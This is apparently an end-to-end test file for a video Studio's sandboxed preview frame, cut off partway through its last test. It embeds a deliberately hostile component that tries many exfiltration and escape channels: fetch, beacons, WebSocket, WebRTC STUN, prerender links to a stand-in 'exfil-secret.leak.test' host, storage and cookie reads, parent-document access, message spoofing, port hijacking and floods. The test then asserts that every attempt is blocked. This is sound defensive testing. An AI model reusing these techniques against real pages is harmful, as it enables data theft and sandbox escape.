/**
 * L4.5 part B: the preview sandbox end to end in headless Chromium (playwright-core's build; VP9 captures — that build
 * plays no H.264). A real Studio server and its player origin; a page of the Studio (its CSP: `frame-src` = the player
 * origin) embeds the preview frame the way the timeline screen will (parent.ts, PREVIEW_FRAME_ATTRS); the plans come
 * from engine.timeline.view through `player.publish`, the bundle is the real one (Player, DemoVideo, every component).
 *
 * - POSITIVE CONTROL first (critique B1): the hostile workspace component is used by the plan; its module posts `ran`
 *   when the frame loads it, and once drawn it loads one allowed capability URL (the theme font) and reports its size.
 *   Only then do its attack results count: fetch / XHR / no-cors fetch / beacon / WebSocket / EventSource / img /
 *   audio / CSS background and @import / FontFace / prefetch / preload / stylesheet / script / child frame / object /
 *   ping / window.open / top navigation / Worker / form / the Studio's /v1/info and /v1/call / WebRTC directly and via
 *   an about:blank child / storage, IndexedDB, cookie / parent.document / spoofed hello and messages on window — and,
 *   last, meta refresh, self and data: navigations. Asserted: each result, a third loopback port's hits = 0, a UDP
 *   STUN sink's packets = 0, the Studio's cross-site requests and ops unchanged, the page ignored the spoofs.
 * - A component that throws at module scope is `missing` (its kind's stand-in, a warning); the rest of the preview
 *   plays (critique B3). `settled` arrives for the frame asked (B8); the preview starts muted, `mute` unmutes it (B17).
 * - A theme font that fails: a warning, text still drawn, still settled (B8); a component the plan does not use never
 *   runs (B3); a Lottie card draws (its JSON a CORS fetch of the plan's capability URL).
 * - ⚑ A component flooding `window` (100,000 messages: no listener of the page left, the preview goes on) and then the
 *   port it stole (the budget stops the preview): the page's 20 ms timer never stalls 200 ms (B2).
 * - L4.5 fixes (review A H1 c): ⚑ a workspace component the session has not allowed is never evaluated (not in the
 *   bundle, its stand-in draws); the positive control is the same component once allowed.
 * - Review A H1 a / b, L2 (Chrome follows `<link rel="prerender">` despite the frame's CSP and sandbox; Playwright's
 *   'chromium' channel prerenders, its headless shell does not): the hostile component also tries a prerender link in
 *   the head, in the body, to an invented `.leak.test` name, via insertAdjacentHTML, setAttribute('rel'), relList.add
 *   and an Attr's value setter; a custom element; an iframe with srcdoc and a srcdoc child loading the frame's bundle.
 *   Each throws a TypeError (boot.ts, Trusted Types); the third port gets nothing, and the browser's net log names no
 *   `.leak.test` host (`MAP *.leak.test 127.0.0.1`: a lookup never leaves the machine, a connection lands on the sink).
 * - ⚑ The frame's bundle outside the frame document — the frame one level deeper (parent ≠ top), the same document and
 *   scripts at another path of the player — posts no hello and loads no plan; the real frame beside them does.
 */
import { execFileSync } from 'node:child_process';
import { createSocket } from 'node:dgram';
import type { Socket } from 'node:dgram';
import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { createServer } from 'node:http';
import type { Server } from 'node:http';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium } from 'playwright-core';
import type { Browser, Frame, Page } from 'playwright-core';
import { scaffoldDir } from '@retake/components';
import { memoRegistry } from '@retake/engine';
import type { TimelineViewResult } from '@retake/engine';
import { startStudioServer } from '../src/index.js';
import type { StudioServer } from '../src/index.js';
import { STOP_FLOOD } from '../src/player/parent.js';
import { workspaceComponents } from '../src/player/bundle-player.js';
import { synthTimeline } from '../../editor/test/helpers.js';
import { REPO, hasTool } from '../../editor/test/render-helpers.js';

const canRun = hasTool('ffmpeg');
const PROJECT = 'demo';
let ws: string;
let studio: StudioServer;
let browser: Browser;
let other: Server;
let otherPort = 0;
let udp: Socket;
let udpPort = 0;
const otherHits: string[] = [];
let udpPackets = 0;
let parentJs = '';
let netlog = '';
let launches = 0;
const savedHome = process.env.RETAKE_HOME;

const hostileSource = () => `import { useEffect } from 'react';
import { AbsoluteFill } from 'remotion';
const O = ${JSON.stringify(`http://127.0.0.1:${otherPort}`)};
const S = ${JSON.stringify(studio.url.replace(/\/$/, ''))};
const UDP = ${udpPort};
const R = (k, v) => parent.postMessage({ type: 'r', k, v: String(v).slice(0, 200) }, '*');
R('ran', 'module');
// A child frame running the frame's bundle would say hello to this window (it never may: review A L2).
addEventListener('message', (e) => { if (e.source !== parent && e.data && e.data.type === 'hello') R('childHello', 'got'); });
const stun = async (C) => {
  if (typeof C !== 'function') return 'removed';
  const pc = new C({ iceServers: [{ urls: 'stun:127.0.0.1:' + UDP }] });
  pc.createDataChannel('x');
  await pc.setLocalDescription(await pc.createOffer());
  return 'offer made';
};
const settle = (el, ok, bad) => new Promise((res) => { el[ok] = () => res('loaded'); el[bad] = () => res('error'); });
const add = (el) => { document.body.appendChild(el); return 'set'; };
const tries = {
  fetch: () => fetch(O + '/fetch').then((r) => 'status ' + r.status),
  fetchNoCors: () => fetch(O + '/nocors', { mode: 'no-cors' }).then(() => 'ok'),
  xhr: () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res('status ' + x.status); x.onerror = () => res('error'); x.open('GET', O + '/xhr'); x.send(); }),
  beacon: () => (typeof navigator.sendBeacon === 'function' ? 'sent ' + navigator.sendBeacon(O + '/beacon', 'x') : 'removed'),
  ws: () => { const w = new WebSocket('ws://127.0.0.1:${otherPort}/ws'); return new Promise((res) => { w.onopen = () => res('open'); w.onerror = () => res('error'); }); },
  es: () => { const e = new EventSource(O + '/es'); return new Promise((res) => { e.onopen = () => res('open'); e.onerror = () => { e.close(); res('error'); }; }); },
  img: () => { const i = new Image(); const p = settle(i, 'onload', 'onerror'); i.src = O + '/img'; return p; },
  audio: () => { const a = new Audio(O + '/audio'); a.play().catch(() => {}); return 'set'; },
  cssBg: () => { const d = document.createElement('div'); d.style.cssText = 'width:9px;height:9px;background-image:url(' + O + '/cssbg)'; return add(d); },
  cssImport: () => { const s = document.createElement('style'); s.textContent = '@import url(' + O + '/cssimport);'; document.head.appendChild(s); return 'set'; },
  fontFace: () => new FontFace('Leak', 'url(' + O + '/font)').load().then(() => 'loaded'),
  prefetch: () => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = O + '/prefetch'; document.head.appendChild(l); return 'set'; },
  preload: () => { const l = document.createElement('link'); l.rel = 'preload'; l.as = 'image'; l.href = O + '/preload'; document.head.appendChild(l); return 'set'; },
  stylesheet: () => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = O + '/sheet'; const p = settle(l, 'onload', 'onerror'); document.head.appendChild(l); return p; },
  script: () => { const s = document.createElement('script'); s.src = O + '/script'; const p = settle(s, 'onload', 'onerror'); document.head.appendChild(s); return p; },
  childFrame: () => { const f = document.createElement('iframe'); f.src = O + '/childframe'; return add(f); },
  object: () => { const o = document.createElement('object'); o.data = O + '/object'; return add(o); },
  ping: () => { const a = document.createElement('a'); a.href = '#x'; a.ping = O + '/ping'; add(a); a.click(); return 'clicked'; },
  windowOpen: () => String(window.open(O + '/open')),
  topNav: () => { top.location.href = O + '/top'; return 'set'; },
  worker: () => { const w = new Worker(URL.createObjectURL(new Blob(['fetch("' + O + '/worker")'], { type: 'text/javascript' }))); return new Promise((res) => { w.onerror = () => res('error'); }); },
  form: () => { const f = document.createElement('form'); f.action = O + '/form'; f.method = 'GET'; add(f); f.submit(); return 'submitted'; },
  studioInfo: () => fetch(S + '/v1/info').then((r) => 'status ' + r.status),
  studioCall: () => fetch(S + '/v1/call/project_list', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }).then((r) => 'status ' + r.status),
  studioImg: () => { const i = new Image(); const p = settle(i, 'onload', 'onerror'); i.src = S + '/v1/info'; return p; },
  rtc: () => typeof window.RTCPeerConnection + ' ' + typeof window.webkitRTCPeerConnection + ' ' + typeof window.RTCDataChannel,
  rtcDirect: () => stun(window.RTCPeerConnection || window.webkitRTCPeerConnection),
  rtcChild: async () => { const f = document.createElement('iframe'); add(f); await new Promise((r) => setTimeout(r, 300)); return stun(f.contentWindow && f.contentWindow.RTCPeerConnection); },
  storage: () => { localStorage.setItem('k', 'v'); return 'readable ' + localStorage.getItem('k'); },
  session: () => { sessionStorage.setItem('k', 'v'); return 'readable'; },
  idb: () => new Promise((res) => { const r = indexedDB.open('x'); r.onsuccess = () => res('open'); r.onerror = () => res('error'); }),
  cookie: () => { document.cookie = 'a=b'; return 'cookie ' + JSON.stringify(document.cookie); },
  parentDoc: () => 'read ' + parent.document.title,
  origin: () => String(self.origin),
  referrer: () => JSON.stringify(document.referrer),
  spoof: () => {
    parent.postMessage({ v: 1, type: 'warning', message: 'SPOOFED' }, '*');
    const ch = new MessageChannel();
    ch.port1.onmessage = (e) => R('spoof-port-got', JSON.stringify(e.data));
    parent.postMessage({ v: 1, type: 'hello', bundle: '0000000000000000' }, '*', [ch.port2]);
    return 'posted';
  },
  // Review A H1: Chrome prerenders a link despite the frame's CSP and sandbox — every way to make one is refused.
  prerenderHead: () => { const l = document.createElement('link'); l.rel = 'prerender'; l.href = O + '/prerender-head?d=' + encodeURIComponent(location.pathname); document.head.appendChild(l); return 'set'; },
  prerenderBody: () => { const l = document.createElement('link'); l.rel = 'prerender'; l.href = O + '/prerender-body'; return add(l); },
  prerenderName: () => { const l = document.createElement('link'); l.rel = 'prerender'; l.href = 'http://exfil-secret.leak.test:${otherPort}/prerender-name?d=PIXELS'; document.head.appendChild(l); return 'set'; },
  prerenderHtml: () => { document.body.insertAdjacentHTML('beforeend', '<link rel="prerender" href="' + O + '/prerender-html">'); return 'set'; },
  prerenderSetAttribute: () => { const l = document.createElement('link'); l.href = O + '/prerender-setattribute'; document.head.appendChild(l); l.setAttribute('rel', 'prerender'); return 'set'; },
  prerenderRelList: () => { const l = document.createElement('link'); l.href = O + '/prerender-rellist'; document.head.appendChild(l); l.relList.add('prerender'); return 'set'; },
  prerenderAttrValue: () => { const l = document.createElement('link'); l.href = O + '/prerender-attr'; const a = document.createAttribute('rel'); l.setAttributeNode(a); document.head.appendChild(l); a.value = 'prerender'; return 'set'; },
  customElement: () => { customElements.define('x-leak', class extends HTMLElement {}); return 'defined'; },
  srcdoc: async () => { const f = document.createElement('iframe'); f.srcdoc = '<p>x</p>'; add(f); await new Promise((r) => setTimeout(r, 300)); return 'child ' + typeof (f.contentWindow && f.contentWindow.RTCPeerConnection); },
  srcdocBundle: async () => {
    const scripts = [...document.scripts].map((s) => s.src).filter((s) => s && !s.includes('/boot.'));
    const f = document.createElement('iframe');
    f.srcdoc = scripts.map((s) => '<script src="' + s + '"><\\/script>').join('') + '<div id="root"></div><img src="' + O + '/srcdoc-img">';
    add(f);
    await new Promise((r) => setTimeout(r, 1000));
    return 'set ' + scripts.length;
  },
};
let started = false;
async function attack(fontUrl) {
  try { const r = await fetch(fontUrl); R('allowed', (await r.arrayBuffer()).byteLength); } catch (e) { R('allowed', 'failed ' + e); }
  for (const [k, f] of Object.entries(tries)) {
    try { R(k, await Promise.race([Promise.resolve().then(f), new Promise((r) => setTimeout(() => r('pending'), 1500))])); }
    catch (e) { R(k, 'throws ' + (e && e.name || e)); }
  }
  R('done', 'yes');
}
addEventListener('message', (e) => {
  const d = e.data;
  if (!d || d.type !== 'nav') return;
  if (d.how === 'meta') { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + O + '/refresh'; document.head.appendChild(m); }
  if (d.how === 'data') location.href = 'data:text/html,<script>parent.postMessage({type:"r",k:"dataNav",v:"ran"},"*")<\\/script>';
  if (d.how === 'self') location.href = O + '/selfnav';
});
export default function Hostile(props) {
  useEffect(() => {
    if (started) return;
    started = true;
    const face = props.theme && props.theme.font_faces && props.theme.font_faces[0];
    void attack(face ? face.url : '');
  }, []);
  return <AbsoluteFill style={{ background: '#123456' }} />;
}
`;

const THROWER = `import { AbsoluteFill } from 'remotion';
throw new Error('a component that throws when its module loads');
export default function Thrower() { return <AbsoluteFill />; }
`;

const FLOOD = `import { useEffect } from 'react';
import { AbsoluteFill } from 'remotion';
let stolen = null;
const post = MessagePort.prototype.postMessage;
MessagePort.prototype.postMessage = function (...a) { if (!stolen) stolen = this; return post.apply(this, a); };
export default function Flood() {
  useEffect(() => {
    // First \`window\` alone (the page has no listener left: free), then the port it stole (the budget stops it).
    setTimeout(() => {
      for (let i = 0; i < 100000; i++) parent.postMessage({ v: 1, type: 'frame', frame: i % 10 }, '*');
    }, 200);
    setTimeout(() => {
      for (let i = 0; i < 100000; i++) if (stolen) post.call(stolen, { v: 1, type: 'frame', frame: i % 10 });
    }, 3000);
  }, []);
  return <AbsoluteFill />;
}
`;

async function addCard(name: string, code: string): Promise<void> {
  const dir = join(ws, 'components', 'acme', name);
  await mkdir(dir, { recursive: true });
  await cp(scaffoldDir('card'), dir, { recursive: true });
  const manifest = (await readFile(join(dir, 'component.yaml'), 'utf8')).replace(/^id: .*$/m, `id: acme/${name}`);
  await writeFile(join(dir, 'component.yaml'), manifest);
  await writeFile(join(dir, 'index.tsx'), code);
}

/** A scenario with a clip and these cards, and a finished capture of it (VP9). */
async function scenarioWithRun(name: string, cards: Array<{ id: string; component?: string; lottie?: string }>): Promise<void> {
  const dir = join(ws, 'projects', PROJECT);
  const text = [
    `video: ${name}`,
    `title: {text: ${name}}`,
    'intro: false',
    'outro: false',
    'music: {file: assets/bed.wav}',
    'scenes:',
    '  - id: a',
    '    page: app',
    '    open: /',
    '    steps:',
    '      - hold: 1',
    ...cards.flatMap((c) => [c.lottie ? `  - card: {lottie: ${c.lottie}, duration: 2}` : `  - card: {${c.component ? `component: ${c.component}, ` : ''}slots: {title: Card ${c.id}}}`, `    id: ${c.id}`]),
    '',
  ].join('\n');
  const run = `20260101-120000-${name}`;
  const runDir = join(dir, 'runs', run);
  await mkdir(runDir, { recursive: true });
  const t = synthTimeline({
    duration: 3,
    entries: [{ id: 'a', t_start: 0.5, t_end: 2.5, steps: [{ action: 'hold', t_start: 0.5, t_end: 2.5 }] }, ...cards.map((c) => ({ card: { id: c.id, ...(c.lottie ? { duration: 2 } : { slots: { title: `Card ${c.id}` } }), ...(c.component ? { component: c.component } : {}) } }))],
    video: { title: { text: name }, intro: false, outro: false, template: 'editorial', music: { file: 'assets/bed.wav' } },
  });
  Object.assign(t, { run_id: run, project: PROJECT, scenario: name });
  // A Lottie card as the runner writes it (synthTimeline's cards take slots only).
  for (const c of cards) if (c.lottie) Object.assign(t.scenes.find((x) => x.id === c.id)!.card!, { lottie: c.lottie });
  await writeFile(join(runDir, 'timeline.json'), JSON.stringify(t));
  await writeFile(join(runDir, 'scenario.yaml'), text);
  await writeFile(
    join(runDir, 'run.json'),
    JSON.stringify({ version: 1, id: run, project: PROJECT, scenario: name, mode: 'capture', status: 'succeeded', started_at: '2026-01-01T12:00:00.000Z', finished_at: '2026-01-01T12:01:00.000Z', dir: runDir, env: 'local', options: { hooks: 'run', headed: false }, steps_total: 1, steps_done: 1, screenshots: [], hooks: { setup: 'ok', teardown: 'ok' }, warnings: [] }),
  );
  execFileSync('ffmpeg', ['-v', 'error', '-y', '-f', 'lavfi', '-i', 'testsrc2=size=320x180:rate=30', '-t', '3', '-c:v', 'libvpx-vp9', '-deadline', 'realtime', '-cpu-used', '8', '-b:v', '200k', '-pix_fmt', 'yuv420p', join(runDir, 'capture.mp4')]);
  await writeFile(join(dir, 'scenarios', `${name}.yaml`), text);
}

async function published(scenario: string): Promise<{ view: Extract<TimelineViewResult, { view: unknown }>; frame_url: string; plan_url: string }> {
  const v = await studio.engine.timeline.view({ project: PROJECT, scenario });
  if (!('view' in v)) throw new Error(`blocked: ${JSON.stringify(v.blocked)}`);
  const p = await studio.player.publish(v, { forbid: [ws, homedir()] });
  return { view: v, ...p };
}

const segFrame = (v: { plan: { segments: Array<{ id: string; from: number; durationInFrames: number }> } }, id: string) => {
  const s = v.plan.segments.find((x) => x.id === id)!;
  return s.from + Math.floor(s.durationInFrames / 2);
};

/** A Studio page (its CSP and frame-src) with the preview harness: parent.ts's connectPreview, as the timeline will. */
async function studioPage(): Promise<Page> {
  const page = await (await browser.newContext({ viewport: { width: 900, height: 600 } })).newPage();
  // A static document of the Studio (its CSP, no app running: no request of its own while the frame attacks).
  const r = await page.goto(`${studio.url}app.css`);
  expect(r?.headers()['content-security-policy']).toContain(`frame-src ${studio.player.origin};`);
  await page.evaluate(parentJs);
  await page.evaluate(() => {
    const w = window as unknown as Record<string, unknown>;
    w.__gaps = [];
    let last = performance.now();
    setInterval(() => {
      const n = performance.now();
      (w.__gaps as number[]).push(n - last);
      last = n;
    }, 20);
  });
  return page;
}

async function openPreview(page: Page, frameUrl: string, planUrl: string, frame: number, record: boolean): Promise<void> {
  await page.evaluate(
    ({ frameUrl, planUrl, frame, record }) => {
      const w = window as unknown as Record<string, any>;
      w.__msgs = [];
      w.__r = [];
      w.__stopped = null;
      const f = document.createElement('iframe');
      for (const [k, v] of Object.entries(w.__dsParent.PREVIEW_FRAME_ATTRS as Record<string, string>)) f.setAttribute(k, v);
      f.style.cssText = 'width:640px;height:360px;border:0;display:block';
      const conn = w.__dsParent.connectPreview(f, {
        onHello: () => conn.send({ type: 'load', plan_url: planUrl, frame }),
        onMessage: (m: unknown) => w.__msgs.push(m),
        onStop: (reason: string) => (w.__stopped = reason),
      });
      if (record) addEventListener('message', (e) => e.source === f.contentWindow && e.data && e.data.type === 'r' && w.__r.push(e.data));
      f.src = frameUrl;
      document.body.appendChild(f);
      w.__conn = conn;
      w.__frame = f;
    },
    { frameUrl, planUrl, frame, record },
  );
}

const msgs = (page: Page) => page.evaluate(() => (window as unknown as { __msgs: Array<Record<string, unknown>> }).__msgs);
const reports = (page: Page) => page.evaluate(() => (window as unknown as { __r: Array<{ k: string; v: string }> }).__r);
async function until<T>(what: string, f: () => Promise<T | undefined | false>, ms = 30_000): Promise<T> {
  const end = Date.now() + ms;
  for (;;) {
    const v = await f();
    if (v) return v;
    if (Date.now() > end) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 100));
  }
}
const previewFrame = (page: Page): Frame => page.frames().find((f) => f.url().startsWith(`${studio.player.origin}/s/`))!;

beforeAll(async () => {
  if (!canRun) return;
  ws = await mkdtemp(join(tmpdir(), 'ds-e2e-sandbox-'));
  process.env.RETAKE_HOME = join(ws, '.home');
  other = createServer((req, res) => {
    otherHits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
    res.end('leaked');
  });
  await new Promise<void>((ok) => other.listen(0, '127.0.0.1', ok));
  otherPort = (other.address() as { port: number }).port;
  udp = createSocket('udp4');
  udp.on('message', () => udpPackets++);
  await new Promise<void>((ok) => udp.bind(0, '127.0.0.1', ok));
  udpPort = udp.address().port;

  await mkdir(join(ws, 'templates'), { recursive: true });
  await cp(join(REPO, 'templates', 'editorial'), join(ws, 'templates', 'editorial'), { recursive: true });
  await writeFile(join(ws, 'retake.yaml'), 'version: 1\nprojects_dir: projects\ntemplates_dir: templates\n');
  const dir = join(ws, 'projects', PROJECT);
  await mkdir(join(dir, 'scenarios'), { recursive: true });
  await mkdir(join(dir, 'assets'), { recursive: true });
  await writeFile(join(dir, 'project.yaml'), 'version: 1\nname: Demo\nenvironments:\n  local: {app: "http://app.test"}\ntemplate: editorial\n');
  execFileSync('ffmpeg', ['-v', 'error', '-y', '-f', 'lavfi', '-i', 'sine=frequency=440:duration=4', '-ac', '2', join(dir, 'assets', 'bed.wav')]);
  studio = await startStudioServer({ root: ws, startWorker: false });
  await addCard('hostile', hostileSource());
  await addCard('thrower', THROWER);
  await addCard('flood', FLOOD);
  await scenarioWithRun('sb', [{ id: 'c1', component: 'acme/hostile' }, { id: 'c2', component: 'acme/thrower' }, { id: 'c3' }]);
  await scenarioWithRun('fl', [{ id: 'c1', component: 'acme/flood' }]);
  await cp(join(REPO, 'projects', 'northfield-fixture', 'assets', 'cup-steam.json'), join(dir, 'assets', 'anim.json'));
  await scenarioWithRun('ff', [{ id: 'c1' }, { id: 'c2', lottie: 'assets/anim.json' }]);
  const { build } = await import('esbuild');
  const out = await build({ entryPoints: [join(import.meta.dirname, '..', 'src', 'player', 'parent.ts')], bundle: true, write: false, format: 'iife', globalName: '__dsParent', platform: 'browser', target: 'chrome120', logLevel: 'silent' });
  parentJs = `${out.outputFiles[0].text}\nwindow.__dsParent = __dsParent;`;
  browser = await launch();
}, 120_000);

/**
 * Playwright's 'chromium' channel (it prerenders; its headless shell does not) and its default arguments. Every
 * `.leak.test` name resolves to the loopback (no lookup leaves the machine; a connection lands on the third port), and
 * the browser's net log is written to `netlog` (complete once the browser is closed).
 */
async function launch(): Promise<Browser> {
  netlog = join(ws, `netlog-${launches++}.json`);
  const executablePath = process.env.RETAKE_CHROMIUM;
  return chromium.launch({
    headless: true,
    ...(executablePath ? { executablePath } : { channel: 'chromium' }),
    args: ['--host-resolver-rules=MAP *.leak.test 127.0.0.1', `--log-net-log=${netlog}`],
  });
}

afterAll(async () => {
  await browser?.close();
  await studio?.close();
  await new Promise<void>((ok) => (other ? other.close(() => ok()) : ok()));
  udp?.close();
  if (savedHome === undefined) delete process.env.RETAKE_HOME;
  else process.env.RETAKE_HOME = savedHome;
  if (ws) await rm(ws, { recursive: true, force: true });
});

/** Allow every workspace component of the test in this Studio session (what the Allow button does, by content hash). */
async function allowAll(): Promise<void> {
  const registry = (await memoRegistry(studio.engine.workspace)).registry;
  for (const c of await workspaceComponents(registry)) studio.previewAllow.allow(c.id, c.hash);
}

describe.skipIf(!canRun)('the preview sandbox in Chromium', () => {
  it('⚑ review A H1 c: a workspace component not allowed in this session is never evaluated; its stand-in draws', async () => {
    expect(studio.previewAllow.size).toBe(0);
    const { view, frame_url, plan_url } = await published('sb');
    const page = await studioPage();
    const at = segFrame(view, 'c1');
    await openPreview(page, frame_url, plan_url, at, true);
    const loaded = await until('loaded', async () => (await msgs(page)).find((m) => m.type === 'loaded'));
    expect(loaded.missing).toEqual(['acme/hostile', 'acme/thrower']);
    expect((loaded.warnings as string[])[0]).toMatch(/workspace component acme\/hostile is not run in the preview until you allow it/);
    await until('settled', async () => (await msgs(page)).some((m) => m.type === 'settled' && m.frame === at));
    await new Promise((r) => setTimeout(r, 1500));
    // Its module never ran (the positive control below: the same component, allowed, reports `ran` at once).
    expect(await reports(page)).toEqual([]);
    await page.context().close();
    await allowAll();
  }, 120_000);

  it('⚑ positive control, then every attack channel blocked; a throwing component is missing; settled; muted start', async () => {
    await allowAll();
    const { view, frame_url, plan_url } = await published('sb');
    expect(view.plan.segments.find((s) => s.id === 'c1')?.component.id).toBe('acme/hostile');
    const page = await studioPage();
    const calls0 = studio.calls;
    const cross0 = studio.crossSite;
    const at = segFrame(view, 'c1');
    await openPreview(page, frame_url, plan_url, at, true);

    // B3: the throwing component is missing (its stand-in draws), the rest loads.
    const loaded = await until('loaded', async () => (await msgs(page)).find((m) => m.type === 'loaded'));
    expect(loaded).toMatchObject({ frames: view.plan.durationInFrames, missing: ['acme/thrower'] });
    expect((loaded.warnings as string[])[0]).toMatch(/component acme\/thrower is not in the preview/);
    // B8: settled at the frame asked.
    await until('settled', async () => (await msgs(page)).some((m) => m.type === 'settled' && m.frame === at));

    // B1: the positive control — the hostile component ran, was drawn, and loaded an allowed capability URL.
    const done = await until('the attacks', async () => {
      const r = await reports(page);
      return r.some((x) => x.k === 'done') && r;
    }, 90_000);
    const got = Object.fromEntries(done.map((x) => [x.k, x.v]));
    expect(got.ran).toBe('module');
    expect(Number(got.allowed)).toBeGreaterThan(10_000);

    for (const k of ['fetch', 'fetchNoCors', 'fontFace', 'studioInfo', 'studioCall']) expect(got[k], k).toMatch(/^throws (TypeError|NetworkError)/);
    for (const k of ['xhr', 'ws', 'es', 'img', 'stylesheet', 'studioImg']) expect(got[k], k).toBe('error');
    // Review A H1 b: a script URL needs Trusted Types (no policy) — refused before any request.
    expect(got.script).toBe('throws TypeError');
    expect(got.beacon).toBe('removed');
    expect(got.windowOpen).toBe('null');
    expect(got.worker).toMatch(/^(error|throws (SecurityError|TypeError))/);
    for (const k of ['topNav', 'storage', 'session', 'idb', 'cookie', 'parentDoc']) expect(got[k], k).toMatch(/^throws SecurityError/);
    expect(got.rtc).toBe('undefined undefined undefined');
    expect(got.rtcDirect).toBe('removed');
    expect(got.rtcChild).not.toBe('offer made');
    expect(got.origin).toBe('null');
    expect(got.referrer).toBe('""');
    expect(got.spoof).toBe('posted');
    // Review A H1 a / b, L2: no prerender link, custom element or child frame can be made (boot.ts, Trusted Types).
    for (const k of ['prerenderHead', 'prerenderBody', 'prerenderName', 'prerenderHtml', 'prerenderSetAttribute', 'prerenderRelList', 'prerenderAttrValue', 'customElement']) expect(got[k], k).toBe('throws TypeError');
    for (const k of ['childFrame', 'object', 'rtcChild', 'srcdoc', 'srcdocBundle']) expect(got[k], k).toBe('throws TypeError');
    expect(got.childHello).toBeUndefined();
    expect(await previewFrame(page).evaluate(() => document.querySelectorAll('link[rel~="prerender" i], iframe, object, embed').length)).toBe(0);
    // The page ignored the spoofs on window: still connected, no spoofed message, the spoofed port got nothing.
    await page.evaluate(() => (window as unknown as { __conn: { send(m: unknown): boolean } }).__conn.send({ type: 'seek', frame: 1 }));
    await until('settled after the spoofs', async () => (await msgs(page)).some((m) => m.type === 'settled' && m.frame === 1));
    expect(await page.evaluate(() => (window as unknown as { __stopped: unknown }).__stopped)).toBeNull();
    expect(JSON.stringify(await msgs(page))).not.toContain('SPOOFED');
    expect((await reports(page)).some((x) => x.k === 'spoof-port-got')).toBe(false);

    // B17: the preview starts muted (the Player's own state, reported); the page unmutes it.
    const states = async () => (await msgs(page)).filter((m) => m.type === 'state');
    expect((await states())[0]).toMatchObject({ playing: false, muted: true });
    await page.evaluate(() => (window as unknown as { __conn: { send(m: unknown): boolean } }).__conn.send({ type: 'mute', muted: false }));
    await until('unmuted', async () => (await states()).some((m) => m.muted === false));

    // Navigations last (each leaves the frame on an error page).
    for (const how of ['meta', 'data', 'self']) {
      await page.evaluate((how) => (window as unknown as { __frame: HTMLIFrameElement }).__frame.contentWindow?.postMessage({ type: 'nav', how }, '*'), how);
      await new Promise((r) => setTimeout(r, 1200));
    }
    await new Promise((r) => setTimeout(r, 1500));
    expect(otherHits).toEqual([]);
    expect(udpPackets).toBe(0);
    expect(studio.crossSite).toBe(cross0);
    expect(studio.calls).toBe(calls0);
    expect((await reports(page)).some((x) => x.k === 'dataNav')).toBe(false);
    await page.context().close();
    // The net log (complete once the browser closed) names no `.leak.test` host: none was looked up or connected to.
    await browser.close();
    const log = await readFile(netlog, 'utf8');
    expect(log).toContain(studio.player.origin);
    expect([...new Set(log.match(/[a-z0-9-]+\.leak\.test/g) ?? [])]).toEqual([]);
    browser = await launch();
  }, 180_000);

  it('⚑ review A L2: the frame bundle outside the frame document (nested deeper, another path) posts no hello, loads no plan', async () => {
    const { frame_url, plan_url } = await published('ff');
    const page = await studioPage();
    // The frame document (its CSP, boot.js, b.js) answered by the player for another path (the request rewritten).
    const otherUrl = frame_url.replace(/\/frame$/, '/elsewhere');
    await page.context().route(otherUrl, (route) => route.continue({ url: frame_url }));
    await page.evaluate(
      ({ frameUrl, otherUrl, planUrl }) => {
        const w = window as unknown as Record<string, any>;
        w.__got = [];
        const make = (doc: Document, src: string) => {
          const f = doc.createElement('iframe');
          for (const [k, v] of Object.entries(w.__dsParent.PREVIEW_FRAME_ATTRS as Record<string, string>)) f.setAttribute(k, v);
          f.src = src;
          doc.body.appendChild(f);
          return f;
        };
        // Whoever says hello is answered with the plan, as the timeline would.
        const listen = (win: Window, tagOf: (e: MessageEvent) => string) =>
          win.addEventListener('message', (e: MessageEvent) => {
            if (!e.data || typeof e.data !== 'object' || e.data.type === 'r') return;
            const tag = tagOf(e);
            w.__got.push(`${tag} ${e.data.type}`);
            const port = e.ports[0];
            if (e.data.type !== 'hello' || !port) return;
            port.onmessage = (m) => w.__got.push(`${tag} ${m.data && m.data.type}`);
            port.postMessage({ v: 1, type: 'load', plan_url: planUrl, frame: 0 });
          });
        // (a) the frame document one level deeper: Studio page → about:blank child (the page's origin and CSP) → frame.
        const mid = document.createElement('iframe');
        document.body.appendChild(mid);
        listen(mid.contentWindow!, () => 'nested');
        w.__nested = make(mid.contentDocument!, frameUrl);
        // (b) another path, a direct child of the page; (c) the real frame beside them (the control).
        const other = make(document, otherUrl);
        const control = make(document, frameUrl);
        listen(window, (e) => (e.source === other.contentWindow ? 'path' : e.source === control.contentWindow ? 'control' : 'unknown'));
      },
      { frameUrl: frame_url, otherUrl, planUrl: plan_url },
    );
    const got = () => page.evaluate(() => (window as unknown as { __got: string[] }).__got);
    await until('the control loaded', async () => (await got()).includes('control loaded'));
    await new Promise((r) => setTimeout(r, 2000));
    expect((await got()).filter((x) => !x.startsWith('control '))).toEqual([]);
    // Each document ran boot.js and b.js under the frame's CSP (WebRTC removed); only the control fetched its plan.
    const seen: Record<string, unknown> = {};
    for (const f of page.frames().filter((f) => f.url() === frame_url || f.url() === otherUrl)) {
      const where = f.url() === otherUrl ? 'path' : f.parentFrame()?.url() === 'about:blank' ? 'nested' : 'control';
      seen[where] = await f.evaluate(() => {
        const urls = performance.getEntriesByType('resource').map((r) => new URL(r.name).pathname);
        return [document.readyState, typeof window.RTCPeerConnection, urls.some((u) => /\/b\.[0-9a-f]{16}\.js$/.test(u)), urls.some((u) => u.includes('/plan/'))];
      });
    }
    expect(seen).toEqual({ control: ['complete', 'undefined', true, true], nested: ['complete', 'undefined', true, false], path: ['complete', 'undefined', true, false] });
    await page.context().close();
  }, 120_000);

  it('a theme font that fails: a warning, the text still drawn, still settled; a Lottie card draws (its JSON a CORS fetch)', async () => {
    const { view, frame_url, plan_url } = await published('ff');
    expect(view.plan.segments.find((s) => s.id === 'c2')?.component.id).toBe('studio/lottie');
    // The display face changes after it was published: its URL now answers 404.
    await writeFile(join(ws, 'templates', 'editorial', 'fonts', 'InstrumentSerif-Regular.ttf'), 'not a font any more');
    const page = await studioPage();
